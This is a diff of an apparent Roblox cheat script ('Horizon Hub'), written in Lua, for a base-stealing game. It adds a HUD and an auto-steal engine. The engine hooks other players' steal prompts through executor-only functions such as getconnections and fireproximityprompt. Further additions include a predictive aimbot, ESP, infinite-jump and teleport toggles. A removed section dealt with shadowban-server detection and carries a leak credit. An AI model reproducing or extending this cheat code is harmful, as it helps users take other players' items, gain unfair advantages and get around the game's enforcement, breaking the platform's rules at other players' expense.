+    local ACCENT_DARK=Color3.fromRGB(30,105,200)
+
+    local card=Instance.new("Frame",gui); card.Name="PersistentGrabHUD"; card.Size=UDim2.new(0,256,0,58); card.Position=pos
+    card.BackgroundColor3=Color3.fromRGB(205,232,255); card.BackgroundTransparency=.02; card.BorderSizePixel=0; card.Active=true
+    Instance.new("UICorner",card).CornerRadius=UDim.new(0,10)
+    local sbStroke=Instance.new("UIStroke",card); sbStroke.Color=Color3.fromRGB(0,120,230); sbStroke.Thickness=1.6; sbStroke.Transparency=0
+
+    local sideAccent=Instance.new("Frame",card); sideAccent.Size=UDim2.new(0,3,1,-12); sideAccent.Position=UDim2.new(0,6,0,6)
+    sideAccent.BackgroundColor3=Color3.fromRGB(0,150,255); sideAccent.BorderSizePixel=0; Instance.new("UICorner",sideAccent).CornerRadius=UDim.new(0,2)
+
+    local dot=Instance.new("Frame",card); dot.Size=UDim2.new(0,6,0,6); dot.Position=UDim2.new(0,16,0,9)
+    dot.BackgroundColor3=Color3.fromRGB(0,145,255); dot.BackgroundTransparency=0; dot.BorderSizePixel=0; Instance.new("UICorner",dot).CornerRadius=UDim.new(0,4)
+
+    local stealLbl=Instance.new("TextLabel",card); stealLbl.Size=UDim2.new(0,110,0,16); stealLbl.Position=UDim2.new(0,28,0,4)
+    stealLbl.BackgroundTransparency=1; stealLbl.Text="AUTO STEAL"; stealLbl.TextColor3=Color3.fromRGB(8,52,120)
+    stealLbl.Font=Enum.Font.GothamBold; stealLbl.TextSize=10; stealLbl.TextXAlignment=Enum.TextXAlignment.Left
+    local stealGrad=Instance.new("UIGradient",stealLbl); stealGrad.Rotation=90
+    stealGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(20,90,180)),ColorSequenceKeypoint.new(1,Color3.fromRGB(5,40,105))})
+
+    local stateLbl=Instance.new("TextLabel",card); stateLbl.Size=UDim2.new(0,74,0,12); stateLbl.Position=UDim2.new(0,16,0,22)
+    stateLbl.BackgroundTransparency=1; stateLbl.Text="OFF"; stateLbl.TextColor3=Color3.fromRGB(10,60,140); stateLbl.TextSize=8
+    stateLbl.Font=Enum.Font.GothamBold; stateLbl.TextXAlignment=Enum.TextXAlignment.Left
+
+    local perfLbl=Instance.new("TextLabel",card); perfLbl.Size=UDim2.new(0,118,0,12); perfLbl.Position=UDim2.new(0,78,0,22)
+    perfLbl.BackgroundTransparency=1; perfLbl.Text="FPS --.-  /  --.-ms"; perfLbl.TextColor3=Color3.fromRGB(25,75,150); perfLbl.TextSize=8
+    perfLbl.Font=Enum.Font.GothamMedium; perfLbl.TextXAlignment=Enum.TextXAlignment.Left
+
+    local pctLbl=Instance.new("TextLabel",card); pctLbl.Size=UDim2.new(0,42,0,14); pctLbl.Position=UDim2.new(1,-50,0,20)
+    pctLbl.BackgroundTransparency=1; pctLbl.Text="0%"; pctLbl.TextColor3=Color3.fromRGB(5,40,110); pctLbl.Font=Enum.Font.GothamBlack
+    pctLbl.TextSize=10; pctLbl.TextXAlignment=Enum.TextXAlignment.Right
+
+    local track=Instance.new("Frame",card); track.Size=UDim2.new(1,-24,0,10); track.Position=UDim2.new(0,12,1,-13)
+    track.BackgroundColor3=Color3.fromRGB(150,200,250); track.BackgroundTransparency=0; track.BorderSizePixel=0
+    Instance.new("UICorner",track).CornerRadius=UDim.new(0,5)
+
+    local fillLine=Instance.new("Frame",track); fillLine.Size=UDim2.new(0,0,1,0); fillLine.BackgroundColor3=ACCENT
+    fillLine.BackgroundTransparency=.1; fillLine.BorderSizePixel=0; Instance.new("UICorner",fillLine).CornerRadius=UDim.new(0,5)
+    local fillGrad=Instance.new("UIGradient",fillLine)
+    fillGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(120,205,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,130,245))})
+
+    local dragging,ds,sp=false,nil,nil
+    card.InputBegan:Connect(function(i)
+        if _G.YousefUiLocked then return end
+        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+            dragging=true;ds=i.Position;sp=card.Position
+            i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dragging=false end end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if dragging and not _G.YousefUiLocked and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
+            local d=i.Position-ds
+            card.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(i)
+        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+            if not _G.YousefUiLocked then
+                pcall(function() writefile("horizon_steal_bar_pos.json",game:GetService("HttpService"):JSONEncode({xs=card.Position.X.Scale,xo=card.Position.X.Offset,ys=card.Position.Y.Scale,yo=card.Position.Y.Offset})) end)
+            end
+        end
+    end)
+
+    task.spawn(function()
+        local last=tick();local n=0;local fps=60
+        RunService.RenderStepped:Connect(function() n = n + 1 end)
+        while card.Parent do
+            local now=tick();local dt=now-last
+            if dt>=.25 then fps=n/dt;n=0;last=now end
+            local ping=0
+            pcall(function() ping=LP:GetNetworkPing()*1000 end)
+            perfLbl.Text=string.format("FPS %.2f  /  %.1fms",fps,ping)
+            task.wait(.1)
+        end
+    end)
+
+    task.spawn(function()
+        while gui.Parent do
+            if _G.HorizonHubIntroFinished then
+                gui.Enabled=true; card.Visible=true
+            end
+            task.wait(0.05)
+        end
+    end)
+
+    _G.StealBar={
+        SetProgress=function(v,labelText)
+            v=math.clamp(tonumber(v) or 0,0,1)
+            if _G.HorizonHubIntroFinished then gui.Enabled=true end
+            card.Visible=true; fillLine.Visible=true
+            fillLine.Size=UDim2.new(v,0,1,0)
+            pctLbl.Text=math.floor(v*100+.5).."%"
+            if type(labelText)=="string" and labelText~="" then
+                stateLbl.Text=string.upper(labelText)
+            elseif v>0 then
+                stateLbl.Text="STEALING"
+            end
+            dot.BackgroundColor3=ACCENT_LIT; sbStroke.Color=ACCENT_LIT
+        end,
+        SetState=function(txt)
+            if type(txt)=="string" and txt~="" then
+                stateLbl.Text=string.upper(txt)
+                local s=string.upper(txt)
+                if s=="STEALING" or s=="OP HOLD" then
+                    stateLbl.TextColor3=Color3.fromRGB(0,125,65)
+                else
+                    stateLbl.TextColor3=Color3.fromRGB(10,60,140)
+                end
+            end
+        end,
+        Reset=function()
+            fillLine.Size=UDim2.new(0,0,1,0); pctLbl.Text="0%"
+            local masterOn = isEnabled
+            if _G.HorizonStealModes and _G.HorizonStealModes.GetEnabled then
+                local ok, value = pcall(_G.HorizonStealModes.GetEnabled)
+                if ok then masterOn = value == true end
+            end
+            stateLbl.Text = masterOn and "READY" or "OFF"
+            stateLbl.TextColor3=Color3.fromRGB(10,60,140)
+            dot.BackgroundColor3=ACCENT_DARK; sbStroke.Color=ACCENT_DARK
+        end
+    }
+    _G.StealBar.Reset()
+end
+task.delay(.15,setupNexusGrabBar)
 
 task.spawn(function()
-	warn("[KaWaifu] startup: PlaceId=" .. tostring(game.PlaceId) .. " (engine target 109983668079237)")
+    local lastFrame = tick()
+    local fpsSamples = {}
+    local fpsAvg = 60
+    RunService.RenderStepped:Connect(function()
+        local now = tick()
+        local dt = now - lastFrame
+        lastFrame = now
+        if dt > 0 then
+            table.insert(fpsSamples, 1 / dt)
+            if #fpsSamples > 30 then table.remove(fpsSamples, 1) end
+            local sum = 0
+            for _, v in ipairs(fpsSamples) do sum = sum + v end
+            fpsAvg = sum / #fpsSamples
+        end
+    end)
+    while true do
+        task.wait(0.5)
+        pcall(function()
+            if ProgressPercentLabel and ProgressPercentLabel.Parent then
+                local ping = 0
+                if LP and LP.GetNetworkPing then
+                    ping = math.floor(LP:GetNetworkPing() * 1000 + 0.5)
+                else
+                    local stat = Stats.Network.ServerStatsItem["Data Ping"]
+                    if stat then ping = math.floor(tonumber(stat:GetValue()) or 0) end
+                end
+                local pctStr = tostring(math.floor(_currentStealProgress * 100 + 0.5)) .. "%"
+                ProgressPercentLabel.Text = string.format("%s | FPS:%d | PING:%dms", pctStr, math.floor(fpsAvg + 0.5), ping)
+            end
+        end)
+    end
+end)
 
-	if game.PlaceId == 123923334828954 then
-		sliced86("offline")
-		warn("[KaWaifu] shadowban place detected - engine not started")
+local function getHRP()
+    local char = LP.Character
+    if not char then return nil end
+    return char:FindFirstChild("HumanoidRootPart")
+        or char:FindFirstChild("Torso")
+        or char:FindFirstChild("UpperTorso")
+end
+local function isMyBase(plotName)
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return false end
+    local plot = plots:FindFirstChild(plotName)
+    if not plot then return false end
+    local sign = plot:FindFirstChild("PlotSign")
+    if sign then
+        local yb = sign:FindFirstChild("YourBase")
+        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
+    end
+    return false
+end
 
-		while flag18 do
-			if slicedfn43 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				slicedfn43("Scripter Server Detected", "Shadow banned by SAB - Auto Join won't work here. Switch to another account.", 4.5)
+
+
+
+local SemiV3State = {
+    conn = nil, isStealing = false, stealStartTime = nil, Data = {},
+    HalfFireRange = 10, HalfHoldMin = 1.3, HalfHoldMax = 2.6, HalfEntryDelay = 0.3,
+    lastScan = 0, lastFallbackScan = 0, lastFallbackResult = nil,
+}
+local function sv3PromptDist(prompt)
+    local char = LP.Character
+    if not char then return math.huge end
+    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
+    if not root then return math.huge end
+    local part = prompt.Parent
+    if part and part:IsA("Attachment") then part = part.Parent end
+    while part and not part:IsA("BasePart") and part ~= workspace and part.Parent ~= nil do
+        part = part.Parent
+    end
+    if part and part:IsA("BasePart") then return (part.Position - root.Position).Magnitude end
+    local ok, cf = pcall(function() return prompt.Parent and prompt.Parent.WorldPosition end)
+    if ok and cf then return (cf - root.Position).Magnitude end
+    return math.huge
+end
+local function sv3IsStealPrompt(pr)
+    if not (pr and pr:IsA("ProximityPrompt")) then return false end
+    local a = (pr.ActionText or ""):lower()
+    return a:find("steal") ~= nil or a:find("grab") ~= nil or a:find("snatch") ~= nil
+end
+local function sv3FindNearestPrompt()
+    local char = LP.Character
+    if not char then return nil end
+    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
+    if not root then return nil end
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+    local nearest, dist = nil, math.huge
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:IsA("Model") and not isMyBase(plot.Name) then
+            local pods = plot:FindFirstChild("AnimalPodiums")
+            if pods then
+                for _, pod in ipairs(pods:GetChildren()) do
+                    local base = pod:FindFirstChild("Base")
+                    local sp = base and base:FindFirstChild("Spawn")
+                    if sp then
+                        local d = (sp.Position - root.Position).Magnitude
+                        if d <= Radii.SemiV3 and d < dist then
+                            local found = nil
+                            local att = sp:FindFirstChild("PromptAttachment")
+                            if att then
+                                for _, pr in ipairs(att:GetChildren()) do
+                                    if sv3IsStealPrompt(pr) then found = pr end
+                                end
+                            end
+                            if not found then
+                                for _, pr in ipairs(sp:GetDescendants()) do
+                                    if sv3IsStealPrompt(pr) then found = pr end
+                                end
+                            end
+                            if found then nearest, dist = found, d end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return nearest
+end
+-- Generic fallback scan: if the AnimalPodiums/Spawn structure above was not
+-- found (different map / game update), search every ProximityPrompt on enemy
+-- plots that looks like a steal prompt. Throttled by the caller.
+local function sv3FindNearestPromptFallback()
+    local char = LP.Character
+    if not char then return nil end
+    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
+    if not root then return nil end
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+    local nearest, dist = nil, math.huge
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:IsA("Model") and not isMyBase(plot.Name) then
+            for _, pr in ipairs(plot:GetDescendants()) do
+                if pr:IsA("ProximityPrompt") then
+                    local a = (pr.ActionText or ""):lower()
+                    if a:find("steal") or a:find("grab") then
+                        local d = sv3PromptDist(pr)
+                        if d <= Radii.SemiV3 and d < dist then
+                            nearest, dist = pr, d
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return nearest
+end
+local function sv3CaptureConnections(prompt, data)
+    if not getconnections then return end
+    pcall(function()
+        for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
+            if c.Function then table.insert(data.hold, c.Function) end
+        end
+        for _, c in ipairs(getconnections(prompt.Triggered)) do
+            if c.Function then table.insert(data.trigger, c.Function) end
+        end
+    end)
+end
+local function sv3FireHold(data)
+    for _, fn in ipairs(data.hold) do task.spawn(fn) end
+end
+local function sv3FireTrigger(prompt, data)
+    if #data.trigger > 0 then
+        for _, fn in ipairs(data.trigger) do task.spawn(fn) end
+        return
+    end
+    -- No captured handlers (executor without getconnections, or the game
+    -- connected later). Simulate the prompt directly instead of doing nothing.
+    if fireproximityprompt then
+        pcall(function() fireproximityprompt(prompt) end)
+        return
+    end
+    pcall(function() prompt:InputHoldBegin() end)
+    task.wait(0.3)
+    pcall(function() prompt:InputHoldEnd() end)
+end
+local function sv3ExecuteSteal(prompt)
+    if SemiV3State.isStealing then return end
+    if not SemiV3State.Data[prompt] then
+        SemiV3State.Data[prompt] = {hold = {}, trigger = {}, ready = true}
+        sv3CaptureConnections(prompt, SemiV3State.Data[prompt])
+    end
+    local data = SemiV3State.Data[prompt]
+    if not data.ready then return end
+    data.ready = false
+    SemiV3State.isStealing = true
+    SemiV3State.stealStartTime = tick()
+    task.spawn(function()
+        local fired = false
+        local ok, err = pcall(function()
+            sv3FireHold(data)
+            task.wait(SemiV3State.HalfHoldMin)
+            local lastWasInRange = sv3PromptDist(prompt) <= SemiV3State.HalfFireRange
+            while true do
+                local el = tick() - SemiV3State.stealStartTime
+                if el > SemiV3State.HalfHoldMax or not prompt.Parent then break end
+                setProgress(math.clamp(el / SemiV3State.HalfHoldMax, 0, 1))
+                local nowInRange = sv3PromptDist(prompt) <= SemiV3State.HalfFireRange
+                local firedNow = false
+                if nowInRange then
+                    if lastWasInRange then
+                        firedNow = true
+                    else
+                        task.wait(0.3)
+                        if sv3PromptDist(prompt) <= SemiV3State.HalfFireRange and prompt.Parent then
+                            firedNow = true
+                        else
+                            lastWasInRange = false
+                            task.wait()
+                        end
+                    end
+                    if firedNow then
+                        sv3FireTrigger(prompt, data)
+                        fired = true
+                        break
+                    end
+                else
+                    lastWasInRange = nowInRange
+                    task.wait()
+                end
+            end
+        end)
+        if not ok then warn("[horizonhub] steal error: " .. tostring(err)) end
+        if fired then setProgress(1) end
+        task.wait(0.05)
+        setProgress(0)
+        -- Always unlock, even if something above threw.
+        data.ready = true
+        SemiV3State.isStealing = false
+    end)
+end
+local function startSemiV3Mode()
+    if SemiV3State.conn then pcall(function() SemiV3State.conn:Disconnect() end); SemiV3State.conn = nil end
+    SemiV3State.isStealing = false
+    SemiV3State.conn = RunService.Heartbeat:Connect(function()
+        if not isEnabled then return end
+        local now = tick()
+        -- Watchdog: if a steal ever gets stuck (error inside a captured
+        -- connection etc.), force-unlock the engine so it never dies.
+        if SemiV3State.isStealing then
+            if SemiV3State.stealStartTime and (now - SemiV3State.stealStartTime) > (SemiV3State.HalfHoldMax + 3) then
+                SemiV3State.isStealing = false
+                for _, d in pairs(SemiV3State.Data) do d.ready = true end
+                setProgress(0)
+            end
+            return
+        end
+        -- Throttle the world scan (no need to run it 60x per second).
+        if now - (SemiV3State.lastScan or 0) < 0.2 then return end
+        SemiV3State.lastScan = now
+        local ok, p = pcall(sv3FindNearestPrompt)
+        if not p and (now - (SemiV3State.lastFallbackScan or 0)) > 1.5 then
+            SemiV3State.lastFallbackScan = now
+            task.spawn(function()
+                local ok2, p2 = pcall(sv3FindNearestPromptFallback)
+                if ok2 then SemiV3State.lastFallbackResult = p2 end
+            end)
+        end
+        if not p and SemiV3State.lastFallbackResult then
+            local d = sv3PromptDist(SemiV3State.lastFallbackResult)
+            if d <= Radii.SemiV3 then p = SemiV3State.lastFallbackResult end
+        end
+        if ok and p then pcall(sv3ExecuteSteal, p) end
+    end)
+end
+local function stopSemiV3Mode()
+    if SemiV3State.conn then pcall(function() SemiV3State.conn:Disconnect() end); SemiV3State.conn = nil end
+    SemiV3State.isStealing = false
+    setProgress(0)
+end
+
+
+
+
+local function stopAll()
+    stopSemiV3Mode()
+    setProgress(0)
+end
+local function startAll()
+    if not isEnabled then return end
+    startSemiV3Mode()
+end
+
+-- ============================================================
+-- UI BRIDGE  (this was MISSING -> the "Instant Steal" toggle
+-- button in the main GUI did nothing, and the Radius box too)
+-- ============================================================
+_G.YousefInstantSteal = {
+    SetEnabled = function(v)
+        isEnabled = (v == true)
+        if isEnabled then startAll() else stopAll() end
+        saveConfig()
+    end,
+    GetEnabled = function() return isEnabled end,
+    SetRadius = function(v)
+        local n = tonumber(v) or Radii.SemiV3
+        n = math.clamp(math.floor(n + 0.5), 1, 500)
+        Radii.Normal = n
+        Radii.Semi   = n
+        Radii.SemiV2 = n
+        Radii.SemiV3 = n
+        saveConfig()
+    end,
+    GetRadius = function() return Radii.SemiV3 end,
+    SetMode = function(m)
+        -- Only the SemiV3 engine is implemented, so the engine always
+        -- runs in SemiV3 regardless of what gets passed here.
+        selectedMode = "SemiV3"
+        if isEnabled then startAll() end
+        saveConfig()
+    end,
+    GetMode = function() return "SemiV3" end,
+}
+
+startAll()
+end) end)
+-- end of insta steal
+repeat task.wait() until game:IsLoaded()
+
+Players, RunService, __HH.UIS, TS, Lighting, __HH.HS = game:GetService("Players"), game:GetService("RunService"), game:GetService("UserInputService"), game:GetService("TweenService"), game:GetService("Lighting"), game:GetService("HttpService")
+LP = Players.LocalPlayer
+
+__HH.antiRagdollEnabled, __HH.infJumpEnabled = false, false
+__HH.medusaCounterEnabled = false
+__HH.medusaResetEnabled = false
+__HH.batCounterEnabled = false
+__HH.unwalkEnabled = false
+__HH.medusaDebounce, __HH.medusaLastUsed, __HH.dropActive = false, 0, false
+Conns = {autoSteal = nil, antiRag = nil, batCounter = nil, anchor = {}}
+__HH.tpLockEnabled = false
+__HH.tpLockSetVisual = nil
+__HH.mobBtnRefs = nil
+__HH.batV2Enabled = false
+__HH.batV2SetVisual = nil
+__HH.antiDieEnabled = false
+__HH.setAntiDieVisual = nil
+__HH.antiDieConns = {}
+__HH.setBatCounterVisual = nil
+local startBatCounter, stopBatCounter
+__HH.antiLagEnabled = false
+__HH.removeAccessoriesEnabled = false
+__HH.antiLagDescConn = nil
+__HH.stretchRezEnabled = false
+__HH.stretchRezConn = nil
+__HH.setStretchRezVisual = nil
+
+-- FRHUB Auto Left / Auto Right state, UI setters and controller functions.
+-- Pure is already near Luau's 200-local limit, so these cross-script bridge
+-- names are initialized explicitly while the implementation itself is scoped.
+autoLeftEnabled, autoRightEnabled = false, false
+autoLeftSetVisual, autoRightSetVisual = nil, nil
+startAutoLeft, stopAutoLeft, startAutoRight, stopAutoRight = nil, nil, nil, nil
+toggleAutoLeft, toggleAutoRight = nil, nil
+
+__HH.unwalkSavedAnimate = nil
+__HH._anyKeyListening = false
+end
+do
+__HH._lastKbSet = 0
+__HH.autoTPEnabled = false
+__HH.autoTPHeight = 20
+__HH.autoTPConn = nil
+__HH.setAutoTPVisual = nil
+__HH.setInfJumpVisual = nil
+__HH.mainFrame = nil
+__HH.bgImage = nil
+local _guiLocked = false
+
+setCarryVisual = nil
+setLaggerVisual = nil
+setAutoSwingVisual = nil
+__HH.setBatCounterVisual = nil
+setAntiRagVisual = nil
+setMedusaVisual = nil
+setMedusaResetVisual = nil
+setUnwalkVisual = nil
+setAntiLagVisual = nil
+__HH.setStretchRezVisual = nil
+__HH.setAutoTPVisual = nil
+setSaturationVisual = nil
+setVoidModeVisual = nil
+setStretchRezV2Visual = nil
+setTranspVisual = nil
+setLockVisual = nil
+setMobVisual = nil
+setCircleBtnsVisual = nil
+setShapeVisual = nil
+setRectVisual = nil
+__HH.setInfJumpVisual = nil
+
+__HH.espEnabled = false
+__HH.headlessEnabled = false
+__HH.korbloxEnabled = false
+__HH.setESPVisual = nil
+
+uiScaleValue = 0.6
+__HH.uiScaleObject = nil
+
+__HH.TOGGLE_ON_COLOR = Color3.fromRGB(100, 205, 255)
+
+-- ============================================
+-- FR Hub NEW AIMBOT (replaces Pure/Cursed aimbot engine).
+if type(aimbotV1Speed) ~= "number" then aimbotV1Speed = 56 end
+if type(batAimMode) ~= "string" or (batAimMode ~= "normal" and batAimMode ~= "bypass") then batAimMode = "normal" end
+autoBatEnabled = autoBatEnabled == true
+do
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local GRAVITY = -196.2
+
+    local _hCache = setmetatable({}, {__mode = "k"})
+    local _vCache = setmetatable({}, {__mode = "k"})
+
+    local function _destroyH(part)
+        local c = _hCache[part]
+        if c then
+            pcall(function() if c[1] and c[1].Parent then c[1]:Destroy() end end)
+            pcall(function() if c[2] and c[2].Parent then c[2]:Destroy() end end)
+            _hCache[part] = nil
+        end
+    end
+    local function _destroyV(part)
+        local c = _vCache[part]
+        if c then
+            pcall(function() if c[1] and c[1].Parent then c[1]:Destroy() end end)
+            pcall(function() if c[2] and c[2].Parent then c[2]:Destroy() end end)
+            _vCache[part] = nil
+        end
+    end
+    local function _destroyLV(part)
+        _destroyH(part)
+        _destroyV(part)
+    end
+    local function _getHLV(part)
+        local c = _hCache[part]
+        local lv = c and c[1]
+        if lv and lv.Parent == part then return lv end
+        _destroyH(part)
+        local att = Instance.new("Attachment"); att.Parent = part
+        lv = Instance.new("LinearVelocity")
+        lv.Attachment0 = att
+        lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
+        lv.PrimaryTangentAxis = Vector3.new(1, 0, 0)
+        lv.SecondaryTangentAxis = Vector3.new(0, 0, 1)
+        lv.MaxForce = math.huge
+        lv.RelativeTo = Enum.ActuatorRelativeTo.World
+        lv.PlaneVelocity = Vector2.zero
+        lv.Parent = part
+        _hCache[part] = {lv, att}
+        return lv
+    end
+    local function _getVLV(part)
+        local c = _vCache[part]
+        local lv = c and c[1]
+        if lv and lv.Parent == part then return lv end
+        _destroyV(part)
+        local att = Instance.new("Attachment"); att.Parent = part
+        lv = Instance.new("LinearVelocity")
+        lv.Attachment0 = att
+        lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
+        lv.MaxForce = math.huge
+        lv.RelativeTo = Enum.ActuatorRelativeTo.World
+        lv.VectorVelocity = Vector3.zero
+        lv.Parent = part
+        _vCache[part] = {lv, att}
+        return lv
+    end
+    local function _setV(part, vec)
+        if not part or not part.Parent then return end
+        if vec.Magnitude < 0.01 then
+            _destroyLV(part)
+            return
+        end
+        if math.abs(vec.Y) < 0.01 then
+            _destroyV(part)
+            local lv = _getHLV(part)
+            lv.PlaneVelocity = Vector2.new(vec.X, vec.Z)
+        else
+            _destroyH(part)
+            local lv = _getVLV(part)
+            lv.VectorVelocity = vec
+        end
+    end
+    local function _getV(part)
+        if not part or not part.Parent then return Vector3.zero end
+        return part.AssemblyLinearVelocity
+    end
+
+    local newAimEnabled = false
+    local newBatEquippedThisRun = false
+    local _aimbotTarget = nil
+    local _aimbotTargetPlr = nil
+    local _jumpHistory = {}
+    local _infiniteJumpDetected = false
+    local _tpDownDetected = false
+    local _peakY = 0
+    local _normalModeTimer = 0
+    local _lastTargetY = 0
+
+    local function getAimSpeed()
+        local n = tonumber(aimbotV1Speed) or 56
+        return math.clamp(n, 1, 200)
+    end
+
+    local function findBat()
+        local char = LP.Character
+        if not char then return nil end
+        for _, tool in ipairs(char:GetChildren()) do
+            if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
+                return tool
+            end
+        end
+        local bp = LP:FindFirstChild("Backpack")
+        if bp then
+            for _, tool in ipairs(bp:GetChildren()) do
+                if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
+                    return tool
+                end
+            end
+        end
+        return nil
+    end
+
+    local function getClosestTarget()
+        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return nil, nil, math.huge end
+        local closest, closestPlr, minDist = nil, nil, math.huge
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LP and plr.Character then
+                local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
+                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+                if tRoot and hum and hum.Health > 0 then
+                    local dist = (tRoot.Position - root.Position).Magnitude
+                    if dist < minDist then minDist = dist; closest = tRoot; closestPlr = plr end
+                end
+            end
+        end
+        return closest, closestPlr, minDist
+    end
+
+    local function getStickyTarget(currentRoot)
+        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return nil, nil end
+        local newClosest, newPlr, newDist = getClosestTarget()
+        if not newClosest then return nil, nil end
+        if currentRoot and currentRoot.Parent then
+            local currentPlr = Players:GetPlayerFromCharacter(currentRoot.Parent)
+            local hum = currentRoot.Parent:FindFirstChildOfClass("Humanoid")
+            if currentPlr and hum and hum.Health > 0 then
+                local currentDist = (currentRoot.Position - root.Position).Magnitude
+                if currentPlr == newPlr or newDist > currentDist * 0.7 then
+                    return currentRoot, currentPlr
+                end
+            end
+        end
+        return newClosest, newPlr
+    end
+
+    local function swingCurrentBat(char)
+        local bat = findBat()
+        if bat and bat.Parent == char and bat:IsA("Tool") then
+            pcall(function() bat:Activate() end)
+        end
+    end
+
+    local function detectInfiniteJumpGeneric(targetHRP, hist, infDetected, tpDetected, peakY, normalTimer, lastY)
+        if not targetHRP then
+            return "normal", {}, false, false, 0, 0, 0
+        end
+        local velY = targetHRP.Velocity.Y
+        local posY = targetHRP.Position.Y
+        if posY > peakY then peakY = posY end
+        table.insert(hist, velY)
+        if #hist > 12 then table.remove(hist, 1) end
+        local upwardSpikes = 0
+        for i = 2, #hist do
+            if hist[i] > 0 and hist[i-1] < 0 then
+                upwardSpikes = upwardSpikes + 1
+            end
+        end
+        if upwardSpikes >= 0 and not infDetected then
+            infDetected = true; peakY = posY; tpDetected = false
+        end
+        if infDetected and velY < -80 then
+            tpDetected = true
+            return "tp_down", hist, infDetected, tpDetected, peakY, normalTimer, posY
+        end
+        if infDetected and velY < -20 and (posY < peakY - 5) then
+            return "falling", hist, infDetected, tpDetected, peakY, normalTimer, posY
+        end
+        if infDetected and math.abs(velY) < 5 and posY < lastY + 2 then
+            normalTimer = normalTimer + 1
+            if normalTimer > 8 then
+                return "normal", {}, false, false, 0, 0, posY
+            end
+        else
+            normalTimer = 0
+        end
+        lastY = posY
+        if infDetected then
+            return tpDetected and "tp_down" or "infinite_jump", hist, infDetected, tpDetected, peakY, normalTimer, lastY
+        end
+        return "normal", hist, infDetected, tpDetected, peakY, normalTimer, lastY
+    end
+
+    local function computePredictedPos(myHRP, targetHRP, mode)
+        local curPos = targetHRP.Position
+        local curVel = _getV(targetHRP)
+        if mode == "tp_down" then
+            local landX = curPos.X + curVel.X * 0.5
+            local landZ = curPos.Z + curVel.Z * 0.5
+            local rp = RaycastParams.new()
+            rp.FilterDescendantsInstances = {LP.Character}
+            rp.FilterType = Enum.RaycastFilterType.Exclude
+            local rr = workspace:Raycast(Vector3.new(landX, curPos.Y, landZ), Vector3.new(0, -200, 0), rp)
+            local groundY = rr and rr.Position.Y or curPos.Y
+            return Vector3.new(landX, groundY + 0.5, landZ)
+        elseif mode == "infinite_jump" then
+            return curPos + Vector3.new(curVel.X * 0.175, -2, curVel.Z * 0.175)
+        elseif mode == "falling" then
+            local deltaY = curVel.Y * 0.22
+            local disc = curVel.Y * curVel.Y - 2 * GRAVITY * math.abs(deltaY)
+            local ballT = disc > 0 and ((-curVel.Y - math.sqrt(disc)) / (-GRAVITY)) or 0.18
+            ballT = math.clamp(ballT, 0.04, 0.55)
+            return Vector3.new(
+                curPos.X + curVel.X * ballT,
+                curPos.Y + curVel.Y * ballT + 0.5 * GRAVITY * ballT * ballT + 2.8,
+                curPos.Z + curVel.Z * ballT
+            )
+        else
+            local myPos = myHRP.Position
+            local targetPos = targetHRP.Position
+            local distance = (targetPos - myPos).Magnitude
+            local speedFactor = math.clamp(curVel.Magnitude / 40, 0, 1.2)
+            local distFactor = math.clamp(distance / 80, 0, 1)
+            local leadTime = 0.14 + speedFactor * 0.12 + distFactor * 0.08
+            local predictPos = targetPos + curVel * leadTime
+            predictPos = predictPos + targetHRP.CFrame.LookVector * 0.3
+            return predictPos
+        end
+    end
+
+    local function enableNewAim()
+        newAimEnabled = true
+        newBatEquippedThisRun = false
+        _jumpHistory = {}; _infiniteJumpDetected = false; _tpDownDetected = false
+        _peakY = 0; _normalModeTimer = 0; _lastTargetY = 0
+        local char = LP.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then hum.AutoRotate = false end
+    end
+
+    local function disableNewAim()
+        newAimEnabled = false
+        newBatEquippedThisRun = false
+        local char = LP.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hrp then _destroyLV(hrp); hrp.AssemblyAngularVelocity = Vector3.zero end
+        if hum then hum.AutoRotate = true end
+    end
+
+    local function setAutoBatState(enabled)
+        if enabled then
+            if _G.HorizonStealModes then _G.HorizonStealModes.Suspend() end
+            if __HH.stopBodyLock then __HH.stopBodyLock() end
+        else
+            if _G.HorizonStealModes then _G.HorizonStealModes.Resume() end
